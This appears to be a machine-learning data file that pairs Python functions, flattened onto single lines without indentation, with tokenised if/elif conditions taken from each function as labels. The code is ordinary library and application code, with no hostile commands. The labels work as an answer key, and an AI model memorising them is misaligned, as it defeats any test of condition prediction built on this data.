{"input": "def _generate_patterns(self, intent, intent_utterances, entity_placeholders): unique_patterns = set() patterns = [] stop_words = self._get_intent_stop_words(intent) for utterance in intent_utterances: pattern = self._utterance_to_pattern(utterance, stop_words, entity_placeholders) if pattern not in unique_patterns: unique_patterns.add(pattern) patterns.append(pattern) return patterns", "label": "if pattern not in unique_patterns :"}
{"input": "def generator(): try: _resp_data = DataHelper.flow2origin(self.flow[\"response\"]) or \"\" length = len(_resp_data) size = self.response_chunk_size bandwidth = config.bandwidth if bandwidth > 0: sleep_time = self.response_chunk_size / (bandwidth * 1024) else: sleep_time = 0 for i in range(int(length / size) + 1): time.sleep(sleep_time) self.server_resp_time = time.time() yield _resp_data[i * size : (i + 1) * size] finally: self.update_client_resp_time()", "label": "if bandwidth > 0 :"}
{"input": "def generateMapItemListNode(self, key, value): itemslist = list() for item in value: if key in self.allowedFieldsList: itemslist.append(\"%s = %s\" % (key, self.generateValueNode(item, key))) else: itemslist.append(\"%s\" % (self.generateValueNode(item))) return \"(\" + \" OR \".join(itemslist) + \")\"", "label": "if key in self . allowedFieldsList :"}
{"input": "def _underscore_dict(dictionary): new_dictionary = {} for key, value in dictionary.items(): if isinstance(value, dict): value = _underscore_dict(value) if isinstance(key, str): key = underscore(key) new_dictionary[key] = value return new_dictionary", "label": "if isinstance ( value , dict ) :"}
{"input": "def offsetToRva(self, offset): if self.inmem: return offset for s in self.sections: sbase = s.PointerToRawData if s.SizeOfRawData + s.PointerToRawData > self.getMaxRva(): # SizeOfRawData can be misleading. ssize = s.VirtualSize else: ssize = max(s.SizeOfRawData, s.VirtualSize) if sbase <= offset and offset < sbase + ssize: return offset - s.PointerToRawData + s.VirtualAddress return 0", "label": "if s . SizeOfRawData + s . PointerToRawData > self . getMaxRva ( ) :"}
{"input": "def func(): end_received = False while True: for idx, q in enumerate(self._local_out_queues): data = q.get() q.task_done() if isinstance(data, EndSignal): end_received = True if idx > 0: continue self._out_queue.put(data) if end_received: break", "label": "if end_received :"}
{"input": "def unwrap_assert_methods() -> None: for patcher in _mock_module_patches: try: patcher.stop() except RuntimeError as e: # a patcher might have been stopped by user code (#137) # so we need to catch this error here and ignore it; # unfortunately there's no public API to check if a patch # has been started, so catching the error it is if str(e) == \"stop called on unstarted patcher\": pass else: raise _mock_module_patches[:] = [] _mock_module_originals.clear()", "label": "if str ( e ) == \"stop called on unstarted patcher\" :"}
{"input": "def run(self): queue = self.queue while True: if not self.running: break # Grab our data callback, requests, fetchTimeout, validityOverride = queue.get() # Grab prices, this is the time-consuming part if len(requests) > 0: Price.fetchPrices(requests, fetchTimeout, validityOverride) wx.CallAfter(callback) queue.task_done() # After we fetch prices, go through the list of waiting items and call their callbacks for price in requests: callbacks = self.wait.pop(price.typeID, None) if callbacks: for callback in callbacks: wx.CallAfter(callback)", "label": "if len ( requests ) > 0 :"}
{"input": "def loadGCodeData(self, dataStream): if self._printing: return False self._lineCount = 0 for line in dataStream: # Strip out comments, we do not need to send comments if \";\" in line: line = line[: line.index(\";\")] # Strip out whitespace at the beginning/end this saves data to send. line = line.strip() if len(line) < 1: continue self._lineCount += 1 self._doCallback() return True", "label": "if \";\" in line :"}
{"input": "def _prepare_work_root(self): if os.path.exists(self.work_root): for f in os.listdir(self.work_root): if os.path.isdir(os.path.join(self.work_root, f)): shutil.rmtree(os.path.join(self.work_root, f)) else: os.remove(os.path.join(self.work_root, f)) else: os.makedirs(self.work_root)", "label": "if os . path . isdir ( os . path . join ( self . work_root , f ) ) :"}
{"input": "def _parse(self): for factory in self._sub_factories(): if factory.is_possible_start(self.get_next_token()): node, self.token_pos = factory(**self._initializer_args())._parse_with_pos() return node self.raise_unexpected_token()", "label": "if factory . is_possible_start ( self . get_next_token ( ) ) :"}
{"input": "def run(self): try: if not self.shell: self.shell = os.name == \"nt\" if self.working_dir != \"\": os.chdir(self.working_dir) proc = subprocess.Popen( self.command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=self.shell, env=self.env, ) output = codecs.decode(proc.communicate()[0]) self.on_done(output) except subprocess.CalledProcessError as e: self.on_done(e.returncode, error=True) except OSError as e: self.on_done(e.message, error=True)", "label": "if self . working_dir != \"\" :"}
{"input": "def is_filtered_inherited_member(name: str, obj: Any) -> bool: if inspect.isclass(self.object): for cls in self.object.__mro__: if cls.__name__ == self.options.inherited_members and cls != self.object: # given member is a member of specified *super class* return True elif name in cls.__dict__: return False elif name in self.get_attr(cls, \"__annotations__\", {}): return False elif isinstance(obj, ObjectMember) and obj.class_ is cls: return False return False", "label": "elif name in cls . __dict__ :"}
{"input": "def _connect(s, address): try: s.connect(address) except socket.error: (ty, v) = sys.exc_info()[:2] if hasattr(v, \"errno\"): v_err = v.errno else: v_err = v[0] if v_err not in [errno.EINPROGRESS, errno.EWOULDBLOCK, errno.EALREADY]: raise v", "label": "if v_err not in [ errno . EINPROGRESS , errno . EWOULDBLOCK , errno . EALREADY ] :"}
{"input": "def _send_file(self, conn, path): \"\"\"Method for a file PUT coro\"\"\" while True: chunk = conn.queue.get() if not conn.failed: try: with ChunkWriteTimeout(self.app.node_timeout): conn.send(chunk) except (Exception, ChunkWriteTimeout): conn.failed = True self.exception_occurred( conn.node, _(\"Object\"), _(\"Trying to write to %s\") % path ) conn.queue.task_done()", "label": "if not conn . failed :"}
{"input": "def get_http_auth(self, name): auth = self._config.get(\"http-basic.{}\".format(name)) if not auth: username = self._config.get(\"http-basic.{}.username\".format(name)) password = self._config.get(\"http-basic.{}.password\".format(name)) if not username and not password: return None else: username, password = auth[\"username\"], auth.get(\"password\") if password is None: password = self.keyring.get_password(name, username) return { \"username\": username, \"password\": password, }", "label": "if not username and not password :"}
{"input": "def _do_analyze(self, action_ref, rule_links=None, processed=None, depth=0): if processed is None: processed = set() if rule_links is None: rule_links = [] processed.add(action_ref) for rule_link in self._rules.get(action_ref, []): rule_links.append((depth, rule_link)) if rule_link._dest_action_ref in processed: continue self._do_analyze( rule_link._dest_action_ref, rule_links=rule_links, processed=processed, depth=depth + 1, ) return rule_links", "label": "if rule_link . _dest_action_ref in processed :"}
{"input": "def _mock_manager_nfx(self, *args, **kwargs): if args: if args[0].tag == \"command\": raise RpcError() elif args[0].tag == \"get-software-information\" and args[0].find(\"./*\") is None: return True else: return self._read_file(\"sw_info_nfx_\" + args[0].tag + \".xml\")", "label": "elif args [ 0 ] . tag == \"get-software-information\" and args [ 0 ] . find ( \"./*\" ) is None :"}
{"input": "def test_url_invalid_set(): for line in URL_INVALID_TESTS.split(\"\\n\"): # strip line, skip over empty lines line = line.strip() if line == \"\": continue # skip over comments match = COMMENT.match(line) if match: continue mbox = address.parse(line, strict=True) assert_equal(mbox, None)", "label": "if line == \"\" :"}
{"input": "def _monitor_thread_function(main_process_pid): while True: logger.debug(\"Monitor thread monitoring pid: %d\", main_process_pid) main_process_alive = any( [ process.pid for process in process_iter() if process.pid == main_process_pid ] ) if not main_process_alive: logger.debug( \"Main process with pid %d is dead. Killing worker\", main_process_pid ) os._exit(0) sleep(1)", "label": "if not main_process_alive :"}
{"input": "def OnInsertCells(self, event=None): # TODO remove below workaround for double actions if self._counter == 1: if self._icells == (self.selection.topleft, self.selection.bottomright): self._counter = 0 self._icells = None return else: self._counter = 1 self._icells = (self.selection.topleft, self.selection.bottomright) self._execute(InsertCells(self.selection.topleft, self.selection.bottomright)) self._resize_grid() self._skip_except_on_mac(event)", "label": "if self . _icells == ( self . selection . topleft , self . selection . bottomright ) :"}
{"input": "def get_scripts(): \"\"\"Get custom npm scripts.\"\"\" proc = Popen([\"npm\", \"run-script\"], stdout=PIPE) should_yeild = False for line in proc.stdout.readlines(): line = line.decode() if \"available via `npm run-script`:\" in line: should_yeild = True continue if should_yeild and re.match(r\"^ [^ ]+\", line): yield line.strip().split(\" \")[0]", "label": "if should_yeild and re . match ( r\"^  [^ ]+\" , line ) :"}
{"input": "def get_netloc(url): \"\"\"Get Domain.\"\"\" try: domain = \"\" parse_uri = urlparse(url) if not parse_uri.scheme: url = \"//\" + url parse_uri = urlparse(url) domain = \"{uri.netloc}\".format(uri=parse_uri) if verify_domain(domain): return domain except Exception: logger.exception(\"[ERROR] Extracting Domain form URL\")", "label": "if verify_domain ( domain ) :"}
{"input": "def initiate_all_local_variables_instances( nodes, local_variables_instances, all_local_variables_instances ): for node in nodes: if node.variable_declaration: new_var = LocalIRVariable(node.variable_declaration) if new_var.name in all_local_variables_instances: new_var.index = all_local_variables_instances[new_var.name].index + 1 local_variables_instances[node.variable_declaration.name] = new_var all_local_variables_instances[node.variable_declaration.name] = new_var", "label": "if new_var . name in all_local_variables_instances :"}
{"input": "def _disconnect(self, sync): if self._connection: if sync: try: self._connection.send_all() self._connection.fetch_all() except (WorkspaceError, ServiceUnavailable): pass if self._connection: self._connection.in_use = False self._connection = None self._connection_access_mode = None", "label": "if sync :"}
{"input": "def init(self): \"\"\"Initialize a booster from the database and validate\"\"\" self.__item = None if self.itemID: self.__item = eos.db.getItem(self.itemID) if self.__item is None: pyfalog.error(\"Item (id: {0}) does not exist\", self.itemID) return if self.isInvalid: pyfalog.error(\"Item (id: {0}) is not a Booster\", self.itemID) return self.build()", "label": "if self . __item is None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_app_id(d.getPrefixedString()) continue if tt == 16: self.set_limit(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def _match_greater_than_or_equal(search_base, attribute, value, candidates): matches = list() for entry in candidates: dn = entry.get(\"dn\") if not dn.endswith(search_base): continue value_from_directory = entry.get(\"attributes\").get(attribute) if str(value_from_directory) >= str(value): entry[\"type\"] = \"searchResEntry\" matches.append(entry) return matches", "label": "if str ( value_from_directory ) >= str ( value ) :"}
{"input": "def list_target_unit_files(self, *modules): # -> [ (unit,enabled) ] \"\"\"show all the target units and the enabled status\"\"\" result = {} enabled = {} for unit in _all_common_targets: result[unit] = None enabled[unit] = \"static\" if unit in _all_common_enabled: enabled[unit] = \"enabled\" if unit in _all_common_disabled: enabled[unit] = \"enabled\" return [(unit, enabled[unit]) for unit in sorted(result)]", "label": "if unit in _all_common_enabled :"}
{"input": "def handle_data(self, data): if self.in_span or self.in_div: if data == \"No such user (please note that login is case sensitive)\": self.no_user = True elif data == \"Invalid password\": self.bad_pw = True elif data == \"User with that email already exists\": self.already_exists = True", "label": "if data == \"No such user (please note that login is case sensitive)\" :"}
{"input": "def walk_tree( root: Element, processor: Callable[[Element], Optional[_T]], stop_after_first: bool = False, ) -> List[_T]: results = [] queue = deque([root]) while queue: currElement = queue.popleft() for child in currElement: if child: queue.append(child) result = processor(child) if result is not None: results.append(result) if stop_after_first: return results return results", "label": "if child :"}
{"input": "def characters(self, ch): if self._inside_fuzzable: modified_value = self._fuzzed_parameters[self._fuzzable_index][1] if isinstance(modified_value, DataToken): modified_value = modified_value.get_value() if self._fuzzed_parameters[self._fuzzable_index][0] == \"base64\": enc_val = base64.b64encode(modified_value) else: enc_val = cgi.escape(modified_value).encode(\"ascii\", \"xmlcharrefreplace\") self.fuzzed_xml_string += enc_val else: self.fuzzed_xml_string += ch", "label": "if self . _fuzzed_parameters [ self . _fuzzable_index ] [ 0 ] == \"base64\" :"}
{"input": "def when_the_task_has_started(context): # 120 * 0.5 = 60 seconds for _ in range(120): app = context.marathon_clients.current[0].get_app(APP_ID) happy_count = app.tasks_running if happy_count >= 3: return time.sleep(0.5) raise Exception(\"timed out waiting for task to start\")", "label": "if happy_count >= 3 :"}
{"input": "def _sock_send(self, msg): try: if isinstance(msg, str): msg = msg.encode(\"ascii\") # http://docs.datadoghq.com/guides/dogstatsd/#datagram-format if self.dogstatsd_tags: msg = msg + b\"|#\" + self.dogstatsd_tags.encode(\"ascii\") if self.sock: self.sock.send(msg) except Exception: Logger.warning(self, \"Error sending message to statsd\", exc_info=True)", "label": "if self . dogstatsd_tags :"}
{"input": "def __init__( self, constraints=None, preferences=None, platforms=None, maxreplicas=None ): if constraints is not None: self[\"Constraints\"] = constraints if preferences is not None: self[\"Preferences\"] = [] for pref in preferences: if isinstance(pref, tuple): pref = PlacementPreference(*pref) self[\"Preferences\"].append(pref) if maxreplicas is not None: self[\"MaxReplicas\"] = maxreplicas if platforms: self[\"Platforms\"] = [] for plat in platforms: self[\"Platforms\"].append({\"Architecture\": plat[0], \"OS\": plat[1]})", "label": "if isinstance ( pref , tuple ) :"}
{"input": "def start(self): if not self._active: self._active = True if self.thread is None: self.exit = threading.Event() self.thread = threading.Thread(target=self.check) self.thread.daemon = True self.thread.start()", "label": "if self . thread is None :"}
{"input": "def on_player_state_changed(self, state): if state == State.playing: self._toggle_player_action.setText(TOGGLE_PLAYER_TEXT[1]) self._toggle_player_action.setIcon(QIcon.fromTheme(\"media-pause\")) self._toggle_player_action.setEnabled(True) else: self._toggle_player_action.setText(TOGGLE_PLAYER_TEXT[0]) self._toggle_player_action.setIcon(QIcon.fromTheme(\"media-play\")) if state == State.stopped: self._toggle_player_action.setEnabled(False) else: self._toggle_player_action.setEnabled(True)", "label": "if state == State . stopped :"}
{"input": "def __init__(self, el): self.elements = list(el) parameters = {} tokens = [] token_quote = \"@\" for key, value in el.attrib.items(): if key == \"token_quote\": token_quote = value if key == \"tokens\": for token in value.split(\",\"): tokens.append((token, REQUIRED_PARAMETER)) elif key.startswith(\"token_\"): token = key[len(\"token_\") :] tokens.append((token, value)) for name, default in tokens: parameters[name] = (token_quote, default) self.parameters = parameters", "label": "elif key . startswith ( \"token_\" ) :"}
{"input": "def create(self): if self.mode == \"INDICES\": self.newInput(\"Integer List\", \"Indices\", \"indices\") self.newOutput(\"Polygon Indices\", \"Polygon Indices\", \"polygonIndices\") elif self.mode == \"VERTEX_AMOUNT\": if self.useList: self.newInput(\"Integer List\", \"Vertex Amounts\", \"vertexAmounts\") self.newOutput( \"Polygon Indices List\", \"Polygon Indices List\", \"polygonIndicesList\" ) else: self.newInput( \"Integer\", \"Vertex Amount\", \"vertexAmount\", value=3, minValue=3 ) self.newOutput(\"Polygon Indices\", \"Polygon Indices\", \"polygonIndices\")", "label": "if self . useList :"}
{"input": "def _chroot_pids(chroot): pids = [] for root in glob.glob(\"/proc/[0-9]*/root\"): try: link = os.path.realpath(root) if link.startswith(chroot): pids.append(int(os.path.basename(os.path.dirname(root)))) except OSError: pass return pids", "label": "if link . startswith ( chroot ) :"}
{"input": "def to_word_end(view, s): if mode == modes.NORMAL: pt = word_end_reverse(view, s.b, count) return sublime.Region(pt) elif mode in (modes.VISUAL, modes.VISUAL_BLOCK): if s.a < s.b: pt = word_end_reverse(view, s.b - 1, count) if pt > s.a: return sublime.Region(s.a, pt + 1) return sublime.Region(s.a + 1, pt) pt = word_end_reverse(view, s.b, count) return sublime.Region(s.a, pt) return s", "label": "if pt > s . a :"}
{"input": "def torch_sparse_Tensor(coords, feats, size=None): if size is None: if feats.dtype == torch.float64: return torch.sparse.DoubleTensor(coords, feats) elif feats.dtype == torch.float32: return torch.sparse.FloatTensor(coords, feats) else: raise ValueError(\"Feature type not supported.\") else: if feats.dtype == torch.float64: return torch.sparse.DoubleTensor(coords, feats, size) elif feats.dtype == torch.float32: return torch.sparse.FloatTensor(coords, feats, size) else: raise ValueError(\"Feature type not supported.\")", "label": "if feats . dtype == torch . float64 :"}
{"input": "def detab(self, text): \"\"\"Remove a tab from the front of each line of the given text.\"\"\" newtext = [] lines = text.split(\"\\n\") for line in lines: if line.startswith(\" \" * markdown.TAB_LENGTH): newtext.append(line[markdown.TAB_LENGTH :]) elif not line.strip(): newtext.append(\"\") else: break return \"\\n\".join(newtext), \"\\n\".join(lines[len(newtext) :])", "label": "elif not line . strip ( ) :"}
{"input": "def iter_input(input, filename, parser, line_by_line): if isinstance(input, basestring): with open(input, \"rb\") as f: for tree in iter_input(f, filename, parser, line_by_line): yield tree else: try: if line_by_line: for line in input: if line: yield et.ElementTree(et.fromstring(line, parser)) else: yield et.parse(input, parser) except IOError: e = sys.exc_info()[1] error(\"parsing %r failed: %s: %s\", filename, e.__class__.__name__, e)", "label": "if line :"}
{"input": "def find_xsubpp(): for var in (\"privlib\", \"vendorlib\"): xsubpp = cfg_lst(\"$Config{%s}/ExtUtils/xsubpp$Config{exe_ext}\" % var) if xsubpp and os.path.isfile(xsubpp[0]): return xsubpp return self.find_program(\"xsubpp\")", "label": "if xsubpp and os . path . isfile ( xsubpp [ 0 ] ) :"}
{"input": "def apply_list(self, expr, rules, evaluation): \"ReplaceRepeated[expr_, rules_]\" try: rules, ret = create_rules(rules, expr, \"ReplaceRepeated\", evaluation) except PatternError: evaluation.message(\"Replace\", \"reps\", rules) return None if ret: return rules while True: evaluation.check_stopped() result, applied = expr.apply_rules(rules, evaluation) if applied: result = result.evaluate(evaluation) if applied and not result.same(expr): expr = result else: break return result", "label": "if applied :"}
{"input": "def __init__( self, lambda_val: Optional[Union[torch.Tensor, Tuple[float, float]]] = None, same_on_batch: bool = False, p: float = 1.0, ) -> None: super(RandomMixUp, self).__init__(p=1.0, p_batch=p, same_on_batch=same_on_batch) if lambda_val is None: self.lambda_val = torch.tensor([0, 1.0]) else: self.lambda_val = ( cast(torch.Tensor, lambda_val) if isinstance(lambda_val, torch.Tensor) else torch.tensor(lambda_val) )", "label": "if isinstance ( lambda_val , torch . Tensor )"}
{"input": "def run_sync(self): count = 0 while count < self.args.num_messages: batch = self.receiver.receive_messages( max_message_count=self.args.num_messages - count, max_wait_time=self.args.max_wait_time or None, ) if self.args.peeklock: for msg in batch: self.receiver.complete_message(msg) count += len(batch)", "label": "if self . args . peeklock :"}
{"input": "def ns_to_timespec(self, nsec): \"\"\"Transforms nanoseconds to a timespec.\"\"\" # http://elixir.free-electrons.com/linux/v4.13.5/source/kernel/time/time.c#L486 ts = self.timespec() if not nsec: ts.tv_sec = 0 ts.tv_nsec = 0 else: ts.tv_sec, rem = divmod(nsec, timespec.NSEC_PER_SEC) if rem < 0: ts.tv_sec -= 1 rem += timespec.NSEC_PER_SEC ts.tv_nsec = rem return ts", "label": "if rem < 0 :"}
{"input": "def fixFunctionDocTag(funcnode): doctext = funcnode.get(\"doc\") if doctext: if funcnode.attrib[\"name\"] == \"eval\": # Update the doc for this function call, more user friendly. funcnode.attrib[\"doc\"] = doctext.replace(\"ECMAScript\", \"JavaScript\") sp = doctext.rsplit(\"Return Type: \", 1) if len(sp) == 2: funcnode.attrib[\"doc\"] = sp[0].rstrip() returnType = standardizeJSType(sp[1].split(None, 1)[0]) addCixReturns(funcnode, returnType) return returnType return None", "label": "if len ( sp ) == 2 :"}
{"input": "def check_engine(engine): if engine == \"auto\": if pa is not None: return \"pyarrow\" elif fastparquet is not None: # pragma: no cover return \"fastparquet\" else: # pragma: no cover raise RuntimeError(\"Please install either pyarrow or fastparquet.\") elif engine == \"pyarrow\": if pa is None: # pragma: no cover raise RuntimeError(\"Please install pyarrow fisrt.\") return engine elif engine == \"fastparquet\": if fastparquet is None: # pragma: no cover raise RuntimeError(\"Please install fastparquet first.\") return engine else: # pragma: no cover raise RuntimeError(\"Unsupported engine {} to read parquet.\".format(engine))", "label": "if pa is not None :"}
{"input": "def addInt(self, intval, width, nodeinfo): node = self.basenode for sh in range(width - 1, -1, -1): choice = (intval >> sh) & 1 if node[choice] is None: node[choice] = [None, None, None] node = node[choice] node[2] = nodeinfo", "label": "if node [ choice ] is None :"}
{"input": "def add_cand(cands): cands = [cand.creator for cand in cands if cand.creator is not None] for x in cands: if x in seen_set: continue order = 1 if fan_out[x] == 1 and len(cands) == 1: order = -len(seen_set) # Negate since heapq is min-heap # `len(seen_set)` is in order to avoid comparing `x` heapq.heappush(cand_funcs, (order, -x.rank, -len(seen_set), x)) seen_set.add(x)", "label": "if fan_out [ x ] == 1 and len ( cands ) == 1 :"}
{"input": "def indentSelection(self, howFar=4): # Indent or outdent current selection by 'howFar' spaces # (which could be positive or negative int). startLineNum = self.LineFromPosition(self.GetSelectionStart()) endLineNum = self.LineFromPosition(self.GetSelectionEnd()) # go through line-by-line self.BeginUndoAction() for lineN in range(startLineNum, endLineNum + 1): newIndent = self.GetLineIndentation(lineN) + howFar if newIndent < 0: newIndent = 0 self.SetLineIndentation(lineN, newIndent) self.EndUndoAction()", "label": "if newIndent < 0 :"}
{"input": "def request(self, host, handler, request_body, verbose=False): # retry request once if cached connection has gone cold for i in (0, 1): try: return self.single_request(host, handler, request_body, verbose) except socket.error as e: if i or e.errno not in (errno.ECONNRESET, errno.ECONNABORTED, errno.EPIPE): raise except http_client.BadStatusLine: # close after we sent request if i: raise", "label": "if i or e . errno not in ( errno . ECONNRESET , errno . ECONNABORTED , errno . EPIPE ) :"}
{"input": "def update_data(self, change): self.mark.x = self.state.x_centers y0 = self.state.grid if self.normalize: y0 = y0 / np.sum(y0) if self.state.grid_sliced is not None: y1 = self.state.grid_sliced if self.normalize: y1 = y1 / np.sum(y1) self.mark.y = np.array([y0, y1]) self.mark.colors = [C0, C1] self.mark.type = \"grouped\" else: self.mark.y = y0 self.mark.colors = [C0]", "label": "if self . normalize :"}
{"input": "def visit_body(self, nodes): new_nodes = [] count = 0 for node in nodes: rewriter = IfExpRewriter(count) possibly_transformed_node = rewriter.visit(node) if rewriter.assignments: new_nodes.extend(rewriter.assignments) count += len(rewriter.assignments) new_nodes.append(possibly_transformed_node) return new_nodes", "label": "if rewriter . assignments :"}
{"input": "def byteRegOffset(self, val, prefixes=0): # NOTE: Override this because there is no AH etc in 64 bit mode if prefixes & PREFIX_REX: # the parse_modrm function deals with register index adds val |= e_i386.RMETA_LOW8 else: # not using REX, revert to old split-registers (low/high) if val < 4: val |= e_i386.RMETA_LOW8 else: val |= e_i386.RMETA_HIGH8 val -= 4 return val", "label": "if val < 4 :"}
{"input": "def gprv_immv(ii): for i, op in enumerate(_gen_opnds(ii)): if i == 0: if op.name == \"REG0\" and op_luf_start(op, \"GPRv\"): continue else: return False elif i == 1: if op_immv(op): continue else: return False else: return False return True", "label": "if i == 0 :"}
{"input": "def normalize(self): self.pairs.sort() i = 1 while i < len(self.pairs): alo, ahi = self.pairs[i - 1] blo, bhi = self.pairs[i] if ahi >= blo - 1: self.pairs[i - 1 : i + 1] = [(alo, max(ahi, bhi))] else: i = i + 1", "label": "if ahi >= blo - 1 :"}
{"input": "def __substitute_composite_key(self, key, composite_file, dataset=None): if composite_file.substitute_name_with_metadata: if dataset: meta_value = str( dataset.metadata.get(composite_file.substitute_name_with_metadata) ) else: meta_value = self.spec[composite_file.substitute_name_with_metadata].default return key % meta_value return key", "label": "if dataset :"}
{"input": "def cb(definition): if len(definition.strip()) == 0: if old_macro_definition != \"\": dialog = wx.MessageDialog( self, _(\"Do you want to erase the macro?\"), style=wx.YES_NO | wx.YES_DEFAULT | wx.ICON_QUESTION, ) if dialog.ShowModal() == wx.ID_YES: self.delete_macro(macro_name) return self.log(_(\"Cancelled.\")) return self.cur_macro_name = macro_name self.cur_macro_def = definition self.end_macro()", "label": "if old_macro_definition != \"\" :"}
{"input": "def process_request(self, request): for old, new in self.names_name: request.uri = request.uri.replace(old, new) if is_text_payload(request) and request.body: try: body = ( str(request.body, \"utf-8\") if isinstance(request.body, bytes) else str(request.body) ) except TypeError: # python 2 doesn't allow decoding through str body = str(request.body) if old in body: request.body = body.replace(old, new) return request", "label": "if is_text_payload ( request ) and request . body :"}
{"input": "def writeLibraryControllers(fp, human, meshes, skel, config, shapes=None): progress = Progress(len(meshes), None) fp.write(\"\\n <library_controllers>\\n\") for mIdx, mesh in enumerate(meshes): subprog = Progress()(0, 0.5) if skel: writeSkinController(fp, human, mesh, skel, config) subprog(0.5, 1) if shapes is not None: writeMorphController(fp, mesh, shapes[mIdx], config) progress.step() fp.write(\" </library_controllers>\\n\")", "label": "if skel :"}
{"input": "def checkpoint(): if checkpoint_asserts: self.assert_integrity_idxs_take() if node in self.idxs_memo: toposort(self.idxs_memo[node]) if node in self.take_memo: for take in self.take_memo[node]: toposort(take)", "label": "if node in self . idxs_memo :"}
{"input": "def __virtual__(): # pylint: disable=expected-2-blank-lines-found-0 try: global __salt__ # pylint: disable=global-statement if not __salt__: __salt__ = salt.loader.minion_mods(__opts__) return True except Exception as e: # pylint: disable=broad-except log.error(\"Could not load __salt__: %s\", e) return False", "label": "if not __salt__ :"}
{"input": "def annotate_disk_for_smart(middleware, devices, disk): args = await get_smartctl_args(middleware, devices, disk) if args: if await ensure_smart_enabled(args): args.extend([\"-a\"]) args.extend([\"-d\", \"removable\"]) return disk, dict(smartctl_args=args)", "label": "if await ensure_smart_enabled ( args ) :"}
{"input": "def make_connection(self, host): h, eh, kwargs = self.get_host_info(host) if not kwargs: kwargs = {} kwargs[\"timeout\"] = self.timeout if _ver_info == (2, 6): result = HTTPS(host, None, **kwargs) else: if not self._connection or host != self._connection[0]: self._extra_headers = eh self._connection = host, httplib.HTTPSConnection(h, None, **kwargs) result = self._connection[1] return result", "label": "if not self . _connection or host != self . _connection [ 0 ] :"}
{"input": "def get_base_types(self, cdef: ClassDef) -> List[str]: \"\"\"Get list of base classes for a class.\"\"\" base_types = [] # type: List[str] for base in cdef.base_type_exprs: if isinstance(base, NameExpr): if base.name != \"object\": base_types.append(base.name) elif isinstance(base, MemberExpr): modname = get_qualified_name(base.expr) base_types.append(\"%s.%s\" % (modname, base.name)) elif isinstance(base, IndexExpr): p = AliasPrinter(self) base_types.append(base.accept(p)) return base_types", "label": "elif isinstance ( base , MemberExpr ) :"}
{"input": "def add_entry(self, entry): # type: (...) -> None version = entry.as_python # type: PythonVersion if version: _ = self.versions[version.version_tuple] paths = {p.path for p in self.versions.get(version.version_tuple, [])} if entry.path not in paths: self.versions[version.version_tuple].append(entry)", "label": "if entry . path not in paths :"}
{"input": "def check(self): global MySQLdb import MySQLdb try: args = {} if mysql_user: args[\"user\"] = mysql_user if mysql_pwd: args[\"passwd\"] = mysql_pwd if mysql_host: args[\"host\"] = mysql_host if mysql_port: args[\"port\"] = mysql_port if mysql_socket: args[\"unix_socket\"] = mysql_socket self.db = MySQLdb.connect(**args) except Exception as e: raise Exception(\"Cannot interface with MySQL server: %s\" % e)", "label": "if mysql_socket :"}
{"input": "def findsection(self, key): to_return = copy.deepcopy(self) for subsection in to_return: try: value = list(ConfigObj.find_key(to_return[subsection], key))[0] except Exception: value = None if not value: del to_return[subsection] else: for category in to_return[subsection]: if category != key: del to_return[subsection][category] # cleanout empty sections and subsections for key in [k for (k, v) in to_return.items() if not v]: del to_return[key] return to_return", "label": "if category != key :"}
{"input": "def get_ready_conn(self, host): conn = None self._lock.acquire() try: if host in self._hostmap: for c in self._hostmap[host]: if self._readymap[c]: self._readymap[c] = 0 conn = c break finally: self._lock.release() return conn", "label": "if host in self . _hostmap :"}
{"input": "def assign_set_scope( ir_set: irast.Set, scope: Optional[irast.ScopeTreeNode], *, ctx: context.ContextLevel ) -> irast.Set: if scope is None: ir_set.path_scope_id = None else: if scope.unique_id is None: scope.unique_id = ctx.scope_id_ctr.nextval() ir_set.path_scope_id = scope.unique_id if scope.find_child(ir_set.path_id): raise RuntimeError(\"scoped set must not contain itself\") return ir_set", "label": "if scope . unique_id is None :"}
{"input": "def _flatten(*args): arglist = [] for arg in args: if isinstance(arg, _Block): if arg.vhdl_code is not None: arglist.append(arg.vhdl_code) continue else: arg = arg.subs if id(arg) in _userCodeMap[\"vhdl\"]: arglist.append(_userCodeMap[\"vhdl\"][id(arg)]) elif isinstance(arg, (list, tuple, set)): for item in arg: arglist.extend(_flatten(item)) else: arglist.append(arg) return arglist", "label": "if id ( arg ) in _userCodeMap [ \"vhdl\" ] :"}
{"input": "def _prepare_expected(data, lags, trim=\"front\"): t, k = data.shape expected = np.zeros((t + lags, (lags + 1) * k)) for col in range(k): for i in range(lags + 1): if i < lags: expected[i : -lags + i, (lags + 1) * col + i] = data[:, col] else: expected[i:, (lags + 1) * col + i] = data[:, col] if trim == \"front\": expected = expected[:-lags] return expected", "label": "if i < lags :"}
{"input": "def test_class_based_views_inherit_from_acl_gateway_class(self): for urlpattern in self.urlpatterns_to_test: callback_name = urlpattern.callback.__name__ module_name = urlpattern.callback.__module__ if (callback_name, module_name) in self.excluded_callbacks: continue imported_module = __import__(module_name, fromlist=[callback_name]) found_callback = getattr(imported_module, callback_name) if not inspect.isclass(found_callback): continue msg = \"Class '{}' does not inherit from 'ACLGateway' \" \"class.\".format( found_callback ) self.assertTrue(issubclass(found_callback, ACLGateway), msg)", "label": "if not inspect . isclass ( found_callback ) :"}
{"input": "def generateMapItemTypedNode(self, key, value): if type(value) == SigmaRegularExpressionModifier: regex = str(value) # Regular Expressions have to match the full value in QRadar if not (regex.startswith(\"^\") or regex.startswith(\".*\")): regex = \".*\" + regex if not (regex.endswith(\"$\") or regex.endswith(\".*\")): regex = regex + \".*\" return \"%s MATCHES %s\" % (self.cleanKey(key), self.generateValueNode(regex)) else: raise NotImplementedError( \"Type modifier '{}' is not supported by backend\".format(value.identifier) )", "label": "if not ( regex . startswith ( \"^\" ) or regex . startswith ( \".*\" ) ) :"}
{"input": "def __str__(self): _outicalfile = self._icalfile for unit in self.units: for location in unit.getlocations(): match = re.match(\"\\\\[(?P<uid>.+)\\\\](?P<property>.+)\", location) for component in self._icalfile.components(): if component.name != \"VEVENT\": continue if component.uid.value != match.groupdict()[\"uid\"]: continue for property in component.getChildren(): if property.name == match.groupdict()[\"property\"]: property.value = unit.target if _outicalfile: return str(_outicalfile.serialize()) else: return \"\"", "label": "if component . uid . value != match . groupdict ( ) [ \"uid\" ] :"}
